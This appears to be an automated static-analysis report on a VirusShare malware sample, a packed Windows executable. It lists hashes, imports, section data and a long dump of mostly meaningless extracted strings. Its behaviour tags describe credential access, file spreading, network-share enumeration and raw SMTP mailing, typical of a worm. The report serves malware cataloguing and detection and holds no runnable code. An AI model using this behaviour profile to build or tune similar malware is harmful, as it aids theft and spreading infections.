{
    "docinfo": {},
    "filename": "VirusShare_3d8acb88f050439acdc1ad9d32379a45",
    "filesize": 131072,
    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
    "hashes": {
        "md5": "3d8acb88f050439acdc1ad9d32379a45",
        "sha1": "8edde0073c94583037164876da4fa072c390f49b",
        "sha256": "c1a7ce2c5901cb37f0b53dc27dee2bc61d0f93ed684d74d07ba8dd533355eb3b"
    },
    "peinfo": {
        "behavior": [
            "Xor",
            "network_tcp_listen",
            "network_smtp_raw",
            "network_tcp_socket",
            "cred_local",
            "spreading_file",
            "win_mutex",
            "win_registry",
            "win_private_profile",
            "win_files_operation"
        ],
        "breakpoint": [
            "CloseHandle",
            "CopyFileA",
            "CreateDirectoryA",
            "CreateFileA",
            "CreateMutexA",
            "CreateThread",
            "DeleteFileA",
            "ExitProcess",
            "ExitThread",
            "FindFirstFileA",
            "FindNextFileA",
            "FindWindowA",
            "GetCommandLineA",
            "GetComputerNameA",
            "GetCurrentProcess",
            "GetDriveTypeA",
            "GetModuleFileNameA",
            "GetModuleHandleA",
            "GetProcAddress",
            "GetStartupInfoA",
            "GetSystemDirectoryA",
            "GetTempFileNameA",
            "GetTempPathA",
            "GetVersionExA",
            "GetWindowsDirectoryA",
            "HeapAlloc",
            "LoadLibraryA",
            "MessageBoxA",
            "OpenProcess",
            "ReadFile",
            "RegCloseKey",
            "RegOpenKeyExA",
            "SetFilePointer",
            "Sleep",
            "TerminateProcess",
            "UnhandledExceptionFilter",
            "VirtualAlloc",
            "VirtualFree",
            "WSAStartup",
            "WaitForSingleObject",
            "WinExec",
            "WriteFile",
            "closesocket",
            "connect",
            "recv",
            "send",
            "socket"
        ],
        "directories": {
            "debug": {},
            "export": [],
            "import": {
                "ADVAPI32.dll": [
                    {
                        "function": "RegCloseKey",
                        "offset": 4259840
                    },
                    {
                        "function": "RegQueryValueExA",
                        "offset": 4259844
                    },
                    {
                        "function": "RegEnumValueA",
                        "offset": 4259848
                    },
                    {
                        "function": "RegSetValueExA",
                        "offset": 4259852
                    },
                    {
                        "function": "RegOpenKeyExA",
                        "offset": 4259856
                    },
                    {
                        "function": "RegNotifyChangeKeyValue",
                        "offset": 4259860
                    }
                ],
                "KERNEL32.dll": [
                    {
                        "function": "GetPrivateProfileSectionA",
                        "offset": 4259868
                    },
                    {
                        "function": "CopyFileA",
                        "offset": 4259872
                    },
                    {
                        "function": "DeleteFileA",
                        "offset": 4259876
                    },
                    {
                        "function": "GetModuleFileNameA",
                        "offset": 4259880
                    },
                    {
                        "function": "CreateDirectoryA",
                        "offset": 4259884
                    },
                    {
                        "function": "lstrlenA",
                        "offset": 4259888
                    },
                    {
                        "function": "GetTempFileNameA",
                        "offset": 4259892
                    },
                    {
                        "function": "GetTempPathA",
                        "offset": 4259896
                    },
                    {
                        "function": "FreeLibrary",
                        "offset": 4259900
                    },
                    {
                        "function": "GetProcAddress",
                        "offset": 4259904
                    },
                    {
                        "function": "LoadLibraryA",
                        "offset": 4259908
                    },
                    {
                        "function": "WaitForSingleObject",
                        "offset": 4259912
                    },
                    {
                        "function": "CreateThread",
                        "offset": 4259916
                    },
                    {
                        "function": "WinExec",
                        "offset": 4259920
                    },
                    {
                        "function": "CreateEventA",
                        "offset": 4259924
                    },
                    {
                        "function": "GetSystemDirectoryA",
                        "offset": 4259928
                    },
                    {
                        "function": "CloseHandle",
                        "offset": 4259932
                    },
                    {
                        "function": "GetComputerNameA",
                        "offset": 4259936
                    },
                    {
                        "function": "GetShortPathNameA",
                        "offset": 4259940
                    },
                    {
                        "function": "Sleep",
                        "offset": 4259944
                    },
                    {
                        "function": "ExitThread",
                        "offset": 4259948
                    },
                    {
                        "function": "FindNextChangeNotification",
                        "offset": 4259952
                    },
                    {
                        "function": "FindFirstChangeNotificationA",
                        "offset": 4259956
                    },
                    {
                        "function": "GetDriveTypeA",
                        "offset": 4259960
                    },
                    {
                        "function": "GetLogicalDriveStringsA",
                        "offset": 4259964
                    },
                    {
                        "function": "SetThreadPriority",
                        "offset": 4259968
                    },
                    {
                        "function": "SetEvent",
                        "offset": 4259972
                    },
                    {
                        "function": "GetModuleHandleA",
                        "offset": 4259976
                    },
                    {
                        "function": "GetLastError",
                        "offset": 4259980
                    },
                    {
                        "function": "CreateMutexA",
                        "offset": 4259984
                    },
                    {
                        "function": "SetLastError",
                        "offset": 4259988
                    },
                    {
                        "function": "GetVersionExA",
                        "offset": 4259992
                    },
                    {
                        "function": "TerminateProcess",
                        "offset": 4259996
                    },
                    {
                        "function": "GetExitCodeProcess",
                        "offset": 4260000
                    },
                    {
                        "function": "OpenProcess",
                        "offset": 4260004
                    },
                    {
                        "function": "GetPrivateProfileSectionNamesA",
                        "offset": 4260008
                    },
                    {
                        "function": "GetPrivateProfileIntA",
                        "offset": 4260012
                    },
                    {
                        "function": "GetPrivateProfileStringA",
                        "offset": 4260016
                    },
                    {
                        "function": "WritePrivateProfileStringA",
                        "offset": 4260020
                    },
                    {
                        "function": "GetWindowsDirectoryA",
                        "offset": 4260024
                    },
                    {
                        "function": "WaitForMultipleObjects",
                        "offset": 4260028
                    },
                    {
                        "function": "TerminateThread",
                        "offset": 4260032
                    },
                    {
                        "function": "SetEnvironmentVariableA",
                        "offset": 4260036
                    },
                    {
                        "function": "FindNextFileA",
                        "offset": 4260040
                    },
                    {
                        "function": "HeapFree",
                        "offset": 4260044
                    },
                    {
                        "function": "GetFileType",
                        "offset": 4260048
                    },
                    {
                        "function": "HeapReAlloc",
                        "offset": 4260052
                    },
                    {
                        "function": "SetHandleCount",
                        "offset": 4260056
                    },
                    {
                        "function": "GetEnvironmentStringsW",
                        "offset": 4260060
                    },
                    {
                        "function": "GetStdHandle",
                        "offset": 4260064
                    },
                    {
                        "function": "FreeEnvironmentStringsW",
                        "offset": 4260068
                    },
                    {
                        "function": "CompareStringA",
                        "offset": 4260072
                    },
                    {
                        "function": "LCMapStringW",
                        "offset": 4260076
                    },
                    {
                        "function": "LCMapStringA",
                        "offset": 4260080
                    },
                    {
                        "function": "SetEndOfFile",
                        "offset": 4260084
                    },
                    {
                        "function": "GetOEMCP",
                        "offset": 4260088
                    },
                    {
                        "function": "GetACP",
                        "offset": 4260092
                    },
                    {
                        "function": "CompareStringW",
                        "offset": 4260096
                    },
                    {
                        "function": "SetFileAttributesA",
                        "offset": 4260100
                    },
                    {
                        "function": "GetCPInfo",
                        "offset": 4260104
                    },
                    {
                        "function": "GetStringTypeW",
                        "offset": 4260108
                    },
                    {
                        "function": "GetStringTypeA",
                        "offset": 4260112
                    },
                    {
                        "function": "MultiByteToWideChar",
                        "offset": 4260116
                    },
                    {
                        "function": "CreateFileA",
                        "offset": 4260120
                    },
                    {
                        "function": "FlushFileBuffers",
                        "offset": 4260124
                    },
                    {
                        "function": "SetStdHandle",
                        "offset": 4260128
                    },
                    {
                        "function": "RtlUnwind",
                        "offset": 4260132
                    },
                    {
                        "function": "FindClose",
                        "offset": 4260136
                    },
                    {
                        "function": "FileTimeToSystemTime",
                        "offset": 4260140
                    },
                    {
                        "function": "VirtualAlloc",
                        "offset": 4260144
                    },
                    {
                        "function": "VirtualFree",
                        "offset": 4260148
                    },
                    {
                        "function": "HeapCreate",
                        "offset": 4260152
                    },
                    {
                        "function": "UnhandledExceptionFilter",
                        "offset": 4260156
                    },
                    {
                        "function": "SetFilePointer",
                        "offset": 4260160
                    },
                    {
                        "function": "WideCharToMultiByte",
                        "offset": 4260164
                    },
                    {
                        "function": "FreeEnvironmentStringsA",
                        "offset": 4260168
                    },
                    {
                        "function": "GetEnvironmentStrings",
                        "offset": 4260172
                    },
                    {
                        "function": "HeapAlloc",
                        "offset": 4260176
                    },
                    {
                        "function": "GetTimeZoneInformation",
                        "offset": 4260180
                    },
                    {
                        "function": "GetSystemTime",
                        "offset": 4260184
                    },
                    {
                        "function": "GetLocalTime",
                        "offset": 4260188
                    },
                    {
                        "function": "FindFirstFileA",
                        "offset": 4260192
                    },
                    {
                        "function": "GetStartupInfoA",
                        "offset": 4260196
                    },
                    {
                        "function": "GetCurrentProcess",
                        "offset": 4260200
                    },
                    {
                        "function": "FileTimeToLocalFileTime",
                        "offset": 4260204
                    },
                    {
                        "function": "ExitProcess",
                        "offset": 4260208
                    },
                    {
                        "function": "ReadFile",
                        "offset": 4260212
                    },
                    {
                        "function": "HeapDestroy",
                        "offset": 4260216
                    },
                    {
                        "function": "GetCommandLineA",
                        "offset": 4260220
                    },
                    {
                        "function": "GetVersion",
                        "offset": 4260224
                    },
                    {
                        "function": "WriteFile",
                        "offset": 4260228
                    }
                ],
                "MPR.dll": [
                    {
                        "function": "WNetAddConnection2A",
                        "offset": 4260236
                    },
                    {
                        "function": "WNetOpenEnumA",
                        "offset": 4260240
                    },
                    {
                        "function": "WNetEnumResourceA",
                        "offset": 4260244
                    },
                    {
                        "function": "WNetCloseEnum",
                        "offset": 4260248
                    },
                    {
                        "function": "WNetCancelConnection2A",
                        "offset": 4260252
                    }
                ],
                "RASAPI32.dll": [
                    {
                        "function": "RasEnumConnectionsA",
                        "offset": 4260260
                    },
                    {
                        "function": "RasGetConnectStatusA",
                        "offset": 4260264
                    }
                ],
                "USER32.dll": [
                    {
                        "function": "EnumWindows",
                        "offset": 4260272
                    },
                    {
                        "function": "MessageBoxA",
                        "offset": 4260276
                    },
                    {
                        "function": "FindWindowA",
                        "offset": 4260280
                    },
                    {
                        "function": "ShowWindowAsync",
                        "offset": 4260284
                    },
                    {
                        "function": "GetWindowTextA",
                        "offset": 4260288
                    },
                    {
                        "function": "CharToOemA",
                        "offset": 4260292
                    },
                    {
                        "function": "PostMessageA",
                        "offset": 4260296
                    }
                ],
                "WS2_32.dll": [
                    {
                        "function": "htons",
                        "offset": 4260304
                    },
                    {
                        "function": "gethostbyaddr",
                        "offset": 4260308
                    },
                    {
                        "function": "gethostbyname",
                        "offset": 4260312
                    },
                    {
                        "function": "inet_ntoa",
                        "offset": 4260316
                    },
                    {
                        "function": "recv",
                        "offset": 4260320
                    },
                    {
                        "function": "select",
                        "offset": 4260324
                    },
                    {
                        "function": "send",
                        "offset": 4260328
                    },
                    {
                        "function": "socket",
                        "offset": 4260332
                    },
                    {
                        "function": "connect",
                        "offset": 4260336
                    },
                    {
                        "function": "closesocket",
                        "offset": 4260340
                    },
                    {
                        "function": "WSAStartup",
                        "offset": 4260344
                    },
                    {
                        "function": "gethostname",
                        "offset": 4260348
                    },
                    {
                        "function": "WSACleanup",
                        "offset": 4260352
                    },
                    {
                        "function": "inet_addr",
                        "offset": 4260356
                    },
                    {
                        "function": "getprotobyname",
                        "offset": 4260360
                    }
                ]
            },
            "relocations": {
                "Size": 0,
                "VirtualAddress": 0,
                "count": 0,
                "details": {}
            },
            "resources": [
                {
                    "data": "b'(\\x00\\x00\\x00 \\x00\\x00\\x00@\\x00\\x00\\x00\\x01\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x80'",
                    "executable": false,
                    "language": "LANG_MACEDONIAN",
                    "name": "RT_ICON",
                    "offset": 140264,
                    "size": 744,
                    "sublanguage": "SUBLANG_DEFAULT"
                },
                {
                    "data": "b'\\x00\\x00\\x01\\x00\\x01\\x00  \\x04\\x00\\x01\\x00\\x04\\x00\\xe8\\x02\\x00\\x00\\x01\\x00'",
                    "executable": false,
                    "language": "LANG_MACEDONIAN",
                    "name": "RT_GROUP_ICON",
                    "offset": 141008,
                    "size": 20,
                    "sublanguage": "SUBLANG_DEFAULT"
                },
                {
                    "data": "b'\\xf8\\x024\\x00\\x00\\x00V\\x00S\\x00_\\x00V\\x00E\\x00R\\x00S\\x00I\\x00O\\x00N\\x00_\\x00I\\x00N\\x00F\\x00O\\x00\\x00\\x00\\x00\\x00\\xbd\\x04\\xef\\xfe\\x00\\x00\\x01\\x00\\x00\\x00'",
                    "executable": false,
                    "language": "LANG_BULGARIAN",
                    "name": "RT_VERSION",
                    "offset": 139504,
                    "size": 760,
                    "sublanguage": "SUBLANG_DEFAULT"
                }
            ],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 41569,
        "features": {
            "antidbg": [
                "FindWindowA",
                "GetLastError",
                "TerminateProcess",
                "UnhandledExceptionFilter"
            ],
            "antivm": {},
            "crypto": [
                "BASE64_table"
            ],
            "mutex": [
                "CreateMutexA",
                "WaitForSingleObject"
            ],
            "packer": [
                "Microsoft_Visual_Cpp_v60",
                "Microsoft_Visual_Cpp_v50v60_MFC_additional",
                "Microsoft_Visual_Cpp_50",
                "Microsoft_Visual_Cpp_v50v60_MFC",
                "Armadillo_v4x",
                "Microsoft_Visual_Cpp"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "4d8991bc33851ee1c480abf8ce0f8637",
        "metadata": {
            "Comments": "",
            "CompanyName": "Macromedia Interactive",
            "FileDescription": "",
            "FileVersion": "1, 0, 0, 1",
            "InternalName": "",
            "LegalCopyright": "Copyright \u00a9 2002",
            "LegalTrademarks": "",
            "OriginalFilename": "",
            "PrivateBuild": "",
            "ProductName": "",
            "ProductVersion": "1, 0, 0, 1",
            "SpecialBuild": ""
        },
        "sections": {
            "count": 4,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'\\x8bD$\\x04\\x81\\xec\\x8c\\x00\\x00\\x00Wh4 A\\x00P\\xe8",
                    "entropy": 6.501041707241665,
                    "executable": true,
                    "hash": {
                        "md5": "5df282aada07b3b6a3420f719eba9602",
                        "sha1": "7923f4e9088a9d3edfc3ba69c7a1511efdf3b2c7",
                        "sha256": "8f5ee7c3f3687e0c3908bc6d0c87f3ec4321f06b0844c37b17a3a93729a409fc"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 61440,
                    "virtual_address": 4096,
                    "virtual_size": 59655
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x16\\x0e\\x01\\x00$\\x0e\\x01\\x008\\x0e\\x01\\x00H\\x0e\\",
                    "entropy": 3.819338225791302,
                    "executable": false,
                    "hash": {
                        "md5": "de36099c67789ebf4facb3d21819c901",
                        "sha1": "95799e00535a3749b5e1ae4482f1a8bfe21b4792",
                        "sha256": "df36ba77721c69787549e87998c6107013b59e7934ce17b796ea585250227223"
                    },
                    "section_name": ".rdata",
                    "size_of_raw_data": 8192,
                    "virtual_address": 65536,
                    "virtual_size": 4750
                },
                {
                    "characteristics": 3221225536,
                    "data": "b'\\x00\\x00\\x00\\x00\\xb0W@\\x00\\x00\\x00\\x00\\x00\\x00\\x",
                    "entropy": 5.469546226963327,
                    "executable": false,
                    "hash": {
                        "md5": "1230208f3aa2f9e3826eb5cb9d7c36f8",
                        "sha1": "b43ec4019a00ff6e1c6113f72f2f79222c111a97",
                        "sha256": "3615494de196eec1bcc63f0c42b4ff1fe6678ec414c6c01b9bb123d4beea06bb"
                    },
                    "section_name": ".data",
                    "size_of_raw_data": 53248,
                    "virtual_address": 73728,
                    "virtual_size": 61792
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 1.8467580231287484,
                    "executable": false,
                    "hash": {
                        "md5": "7a5f85692983449375d4248fe70aa3fa",
                        "sha1": "5c31181e9d7b1581b2b012cabc95439155b55900",
                        "sha256": "3f1e03c79b457c9ff6146e0326303ed608ebf5b94bb1aca487b5f946ab98937a"
                    },
                    "section_name": ".rsrc",
                    "size_of_raw_data": 4096,
                    "virtual_address": 139264,
                    "virtual_size": 1768
                }
            ]
        },
        "timestamp": "2002-10-23 04:40:20"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            "$\u049aE\u06c1E\u06c1E\u06c1Y\u05c1E\u06c1",
            "Y\u0541E\u06c1rZ\u0441E\u06c1Z\u0201E\u06c1E\u0681",
            "E\u06c1rZ\u0401E\u06c1\"C\u0741E\u06c1RichE\u06c1",
            ".text",
            "`.rdata",
            "@.data",
            ".rsrc",
            "Wh4 A",
            "SVWm",
            "\u0445~DUWj9T$",
            "D$ j9L$`PQ",
            "VjLT$pj",
            "h0 A",
            "4Mu]",
            "\u0685tNWST$",
            "SL$\\PQT",
            "VUUUV",
            "\u040dL$h",
            "h0 A",
            "^[_\u010c",
            "UVt$",
            "VUUU",
            "~b33\u048a",
            "F\u0403?I",
            "OAuA",
            "Ht)HuU3&F",
            "=?II",
            "=I\u0403?",
            "A_^]",
            "VWPA",
            "SUfD$",
            "VD$(WL$$",
            "D$<3j@P\\$",
            "f\\$&f\\$*L$8T$<",
            "|$<3\\$BI",
            "t$8$",
            "Rh A",
            "uaD$<h A",
            "D8L$P$",
            "RPht A",
            "hl A",
            "u\\L$<hh A",
            "T$RPQh\\ A",
            "hX A",
            "u1T$<hT A",
            "hP A",
            "uOL$<hL A",
            "T4RPQh@ A",
            "h< A",
            "uNT$<D$|Rh8 A",
            "D4L P$",
            "RPht A",
            "(\"PA",
            "_^][t",
            "SVW|$",
            "SUVWPA",
            "R+T$",
            "L$$QUh A",
            "tAPA",
            "t\t_^]",
            "_^]2[",
            "VL$ j",
            "D$(L$$",
            "VRPQ",
            "_^][\u0110",
            "WVS\u054dND$",
            "VSNs",
            "u_^][\u0110",
            "_^][\u0110",
            "3t$ +t$",
            "|$ +\u044bO",
            "RPQh A",
            "3_^][\u0110",
            "_^][\u0110",
            "_^][",
            "WVSU",
            "VShq",
            "u_^][",
            "_^][",
            "3t$ +t$",
            "T$$L$$Qj",
            "tv|$ 3+\u044bO",
            "RPQh A",
            "3_^][",
            "_^][",
            "UVW3t$",
            "VUYt",
            "Qt$ I",
            "t_^]",
            "3B7u",
            ";|Wx{#;|",
            "p#;}_",
            "%?\\A",
            "?=0A",
            "3S+Ul$(",
            "\\$,PA",
            "L$ QR",
            "T$ Rj",
            "D$$u\\",
            "3I;}t+\u044b",
            "U;uQu",
            "&3I;}",
            "Ph A",
            "WQSD$",
            "33I~7U",
            "3QRUml",
            "3FI;|]S",
            "3VWPA",
            "j@hLA",
            "L$TD$",
            "SUVWl$",
            "RUPQD$ rf",
            "3\u06c5v\u0343",
            "3+\u044bHA",
            "\\u?HA",
            "3\u0443QhJA",
            "L$ jQj",
            "h$!A",
            "T$4hLA",
            "u3L$",
            "QUjh",
            "_^][P",
            "SUVW3h A",
            "2XPD$",
            "h\\!A",
            "3I|)\\u",
            "3ID)T$8hT!A",
            "D$ UP$",
            "t%tQhHA",
            "\u05c5tFt$",
            "u3 hHA",
            "D$8L$xPUhL!A",
            "h@!A",
            "hL!A",
            "u&j\\Um",
            "T$xj",
            "T$xD$",
            "RUP$",
            "h<!A",
            "T$|hHA",
            "j\\hHA",
            "tC-HA",
            "\u04033IIA",
            "+\u028d|$8",
            "L$8Qh(!A",
            "_^][x",
            "T$8D$xRUhL!A",
            "tNL$xj",
            "L$xT$",
            "QUR$",
            "_^][x",
            "SUVW33h A",
            "L$ht$ |$$D$",
            "Rh!A",
            "Vh!A",
            "Vh!A",
            "|$ L$",
            "D$ j",
            "PhHA",
            "VQD$4",
            "QFD$,",
            "uRT$",
            "Rh!A",
            "Ph|!A",
            "Vht!A",
            "L$tztx-$",
            "t&Gt5hHA",
            "\u0545t*hHA",
            "ht!A",
            "L$l\\O",
            "ht!A",
            "L$lFNFh",
            "Vht!A",
            "T$$hT!A",
            "hl!A",
            "D$$$h",
            "PQhL!A",
            "RG\u04c5t*VhHA",
            "hh!A",
            "ht!A",
            "O_^][h",
            "SUVWh!A",
            "L$0Uh!A",
            "h4 A",
            "T$$h!A",
            "u5Vh",
            "WP$0",
            "T$,h!A",
            "PV2]",
            "@;D$",
            "L$(UQ",
            "_^]2[",
            "T$$R",
            "_^][",
            "SUVh!A",
            "Vh!A",
            "h4 A",
            "^]2[",
            "^]2[",
            "ukUh",
            "D$,j",
            "tL3u1;}-L<$D<%u",
            "Gt\u03cbD$",
            "L$$PVj",
            "^]2[",
            "PQRD$",
            "SVWD$",
            "3\\$$D$(+P\u044bh",
            "\u028bT$ ",
            "L$(D$",
            "_^2[",
            "T$ D$",
            "PD$,L$",
            "L$(Q",
            "h< A",
            "hX A",
            "hP A",
            "SUVW",
            "T$(h",
            "Rh\"A",
            "Ph\"A",
            "3T$(+D$",
            "L$(j.Q",
            "T$(3+",
            "jPUL$(h A",
            "t0$8",
            "E_L$",
            "L$(h",
            "Qh\"A",
            "ht\"A",
            "T$($",
            "Rh<\"A",
            "L$($",
            "Qh0\"A",
            "L$,tH$8",
            "L$(PQ\t",
            "t/$8",
            "/PL$,h(\"A",
            "D$($x",
            "j@Rj",
            "j@HQPj",
            "T$0$",
            "D$(h",
            "Ph \"A",
            "L$(h",
            "h \"A",
            "T$(h",
            "Rh \"A",
            "txD$(h",
            "h \"A",
            "j@QVh",
            "T$(h",
            "L$(h!A",
            "u1PT$,h!A",
            "D$($",
            "j@RVh!A",
            "UttD$(h",
            "PQh!A",
            "_^][",
            "SUVWD$,L$0PA",
            "+jfT$8",
            "D$8jPQT$8h A",
            "L$8PQ$",
            "D$P$",
            "t&|$@3D$",
            "D$ fD$ ",
            "D$$D$(D$,",
            "fD$\"",
            "D$@PR;",
            "L$@Q\u058bT$",
            "t,=b",
            "3/=&",
            "c_^][",
            "\u0543tQtMVh",
            "PQR\u05c3t%F",
            "tV}O",
            "_^][",
            "_^]2[",
            "Qh\"A",
            "IQRP",
            "SVWPA",
            "3\uda78\udedc$ ",
            "D$ -",
            "L$,D$(",
            "t[tW",
            "\u0405t9t4$",
            "_^2[",
            "VW|$",
            "t$3+|$",
            "_^_2^",
            "`D$ SUVWj@P",
            "L$0Q",
            "t4\\$",
            "u\u0405D$",
            "\\$tT$",
            "RD$$",
            "t?83+",
            "j.SHW",
            "u&D$",
            ";\u0149D$",
            "z_^]2[`_^]",
            "SVWP@T",
            "Ph&A",
            "T$ h",
            "\\$lh<!A",
            " u\t_^2[D",
            "Qh&A",
            "Rh&A",
            "D$(Ph&A",
            "Qh&A",
            "h<&A",
            "@h,&A",
            "h0 A",
            "hp%A",
            "h0 A",
            "h@%A",
            "h0 A",
            "Rh$A",
            "h0 A",
            "h@%A",
            "h0 A",
            "hL$A",
            "h,$A",
            "h0 A",
            "@h@%A",
            "Wh#A",
            "Wh#A",
            "h0 A",
            "VP@u&_^[D",
            "_^[Dh0 A",
            "uhh@%A",
            "WhX#A",
            "Wh#A",
            "h0 A",
            "VS!8u",
            "_^[Dh0 A",
            "h(#A",
            "h #A",
            "_^[D",
            "Uh A",
            "VWUL$",
            "+j=\u0443O",
            "H_^UG",
            "SUVWhX A",
            "hP A",
            "h< A",
            "_^][P",
            "_^]2[P",
            "j@Q@",
            "T$Th",
            "L$Th",
            "HQPj",
            "PhJA",
            "tgT$T$",
            "RhJA",
            "3T$`+j",
            "3VL$'",
            "t$ j\tV",
            "Rh4IA",
            "QhGA",
            "hl!A",
            "u9D$",
            "hdEA",
            "hTEA",
            "u3T$",
            "hHEA",
            "u<L$",
            "Wh@A",
            "hL?A",
            "h0?A",
            "u<D$",
            "hx;A",
            "hh;A",
            "hT;A",
            "u<T$",
            "hL;A",
            "h<8A",
            "h(8A",
            "h06A",
            "Ph4A",
            "RhH3A",
            "hl!A",
            "h(1A",
            "u9T$",
            "hd/A",
            "hX/A",
            "u<L$",
            "Wh@A",
            "hL?A",
            "h0?A",
            "hD/A",
            "h|-A",
            "hl-A",
            "u9D$",
            "h06A",
            "hX-A",
            "hD-A",
            "u2T$",
            "h4-A",
            "u?L$",
            " D$T$`",
            "Phh(A",
            "T$`$",
            "Rh8(A",
            "L$l$x",
            "Qh'A",
            "D$x$",
            "Ph'A",
            "|$D30I_8)_",
            "~>D$",
            "3+\u0443O",
            "3+j$X",
            "L$8Qj",
            "t)L$4jHQPj",
            "Ph A",
            "D$$jPj",
            "t)T$$jHRPj",
            "L$$D$4QPh A",
            "U3I8)_",
            "t-|$$3+|$",
            "3I)_",
            "h0 A",
            "_^][P",
            "u)PL$",
            "''L$",
            "Ph&A",
            "3+D$",
            "_^][",
            "Vh< A",
            "PVhJA",
            "SUVWhJA",
            "hl!A",
            "T$0uKNA",
            "T$0uHDMA",
            "wTLA",
            "t'jHSPj",
            "Ph A",
            "D$<h A",
            "t&L$",
            "jHQPj",
            "T$8Ph A",
            "3+\u044bO",
            "3+\u044bO",
            "_^][\u0120",
            "(SUVW",
            "\\$<f33It$",
            "tL<<u",
            "3QRUv>",
            "NMF3EI;|3I|",
            "j@SC",
            "j.SC",
            "~l~h;~d3I+\u0283",
            "vQI+\u0283",
            "s@|$",
            "3I~$",
            "FI;|_^]",
            "[(_^]2[(",
            "SVWh< A",
            "|$Lh$OA",
            "L$Xh A",
            "jHRPj",
            "PD$Xh A",
            "+R\u064bO",
            "+j@\u044bP",
            "|tJL$",
            "j@HQPj",
            "PhJA",
            "St!|$",
            "t%jHSPj",
            "Ph A",
            "D$Xh A",
            "t&L$",
            "jHQPj",
            "T$TPh A",
            "3+\u044bO",
            "_^2[",
            "Sh< A",
            "h4 A",
            "upUVWSh",
            "~BD<",
            "u1V ",
            "5G;|C",
            "t_^]S4",
            "VWh< A",
            "h4 A",
            "SUVh",
            "D$xj",
            "L,pj@Q?",
            "T$pD$",
            "D4pL$",
            "|$p3I;},",
            "T4pD$",
            "RPP?",
            "|$pFI;|",
            "thtc+",
            "@}Z\u020dt",
            "p\u044d|$0",
            "D$0P",
            "t,L$0Q%",
            "T$0h!A",
            "][VJ3",
            "SUVWh A",
            "\u897dh A",
            "\u853dh< A",
            "L$H\u81bdD$$j PhOA",
            "QhOA",
            "ShOA",
            "ShOA",
            "SD$$hOA",
            "S\u058bt$ ",
            "\u05c5tXD$",
            "\u05c5tCL$",
            "\u05c5t.T$",
            "BRhOA",
            "_^][@",
            "t$ L$",
            "uIP$B",
            "t6L$",
            "3Q$r",
            "VR\tB",
            "PhJA",
            "L$POL$",
            "t5L$",
            "L$HB",
            "va3;}[I$T1",
            "t7D$",
            "H$T1",
            "H$T1",
            "L$HRh",
            "PT$,S",
            "_^][@",
            "hl A",
            "\u847ah A",
            "\u80bah A",
            "sh< A",
            "dhX A",
            "UhP A",
            "h Y@",
            "SUVWD$",
            "+PQ\u05c5u",
            "PR\u05c5u",
            "+PQ\u05c5u",
            "PR\u05c5u",
            "+PQ\u05c5u",
            "hp[@",
            "u$T$",
            "h0\\@",
            "h \\@",
            "P_^t",
            "h,PA",
            "h$PA",
            "\u0585u h",
            "h$PA",
            "h$PA",
            "h<PA",
            "SUVWD$",
            "Ku-p",
            "|jD$",
            "SVWPA",
            "Br;|]T$",
            "3jRV$",
            "tf=x",
            "hXPA",
            "FjRV$",
            "u_^[",
            "SUVD$",
            "WP3htQA",
            "\\$(\\$",
            "\\$ \\$\"\\$",
            "\\$!Zt",
            "L$$Q;A",
            "T$(jRj",
            "D$4hpQA",
            "PXL$<Q@3",
            "u+4QA",
            "u+PA",
            "RShPA",
            "u'PA",
            "3T$4+",
            "|$4I|",
            "|$43I\\",
            "3L$4$\\",
            "QhPA",
            "RP%=",
            "L$4PQhPA",
            ";t9tPA",
            "j.P.",
            "+\u028d$@",
            ":t $@",
            "tM$@",
            "hdPA",
            "u4$8",
            "L$4PQ$D",
            "hL!A",
            "u1$8",
            "D$4RP$D",
            "hL!A",
            "h`PA",
            "u?L$4hA",
            "t9T$4hA",
            "t#|$43I",
            "L$4PQ$D",
            "hL!A",
            "R\\$#?%",
            "T$4RO",
            "SGSU\\$ \\$!|$(:",
            "3;~(|$",
            "t!UD$8h",
            "F;|j",
            "|$43$\\",
            "3L$4QhPA",
            "PQ$8",
            "|$43$<",
            "BUB!",
            "_^][T",
            "SUVD$",
            "PhRA",
            "L$ hXRA",
            "fT$,",
            "Ph A",
            "R\u8c75$l",
            "j\\hA",
            "tc-A",
            "T$$A",
            "3\u044b$D",
            "Qh0RA",
            "D$$A",
            "3T$$+T$$",
            "\u02cdD$$",
            "+T$$",
            "QhQA",
            "L$0PQX5",
            "t5$@",
            ".t+$@",
            "PQ$L",
            "QR$D",
            "T$$QhQA",
            "L$$PhQA",
            "T$$$H",
            "RPhQA",
            "L$,Q",
            "D$0RPl3",
            "u+$@",
            "j.P&",
            "QR$L",
            "hL!A",
            "T$$h",
            "L$$QhQA",
            "RhQA",
            "h|QA",
            "_^][t5A",
            "t%hA",
            "3V:WL$",
            "j\\hA",
            ";tP-A",
            "T$ jRSD$ h A",
            "t>L$ $0",
            "QR6\"",
            "D$ FjPVL$ h A",
            "t%T$(hRA",
            "D$(j",
            "ShRA",
            "ShRA",
            "\u0528hRA",
            "\u86e7h A",
            "QhRA",
            "BRhRA",
            "SSS@Sj",
            "D$(h",
            "SSS@Sj",
            "QhQA",
            "h|QA",
            "\u82e6tZ$",
            "S@SSA",
            "D$(h",
            "PhQA",
            "3T$(+UT$,",
            "PShQA",
            "T$,QR\\",
            "SSS@j",
            "_^[\u0128",
            " HP\u84ae",
            "j PhSA",
            "t#L$",
            "hxSA",
            "RhRA",
            "\u04a5hpSA",
            "hhSA",
            "hP A",
            "h|QA",
            "hX A",
            "h|QA",
            "h< A",
            "h|QA",
            "VPQhL!A",
            "h<!A",
            "VhxA",
            "Vh|A",
            "@VhTA",
            "VhTA",
            "Vh\u023cA",
            "Vh\u0438A",
            "Vh\u0734A",
            "@VhhA",
            "Vh@A",
            "VhDA",
            "@VhHA",
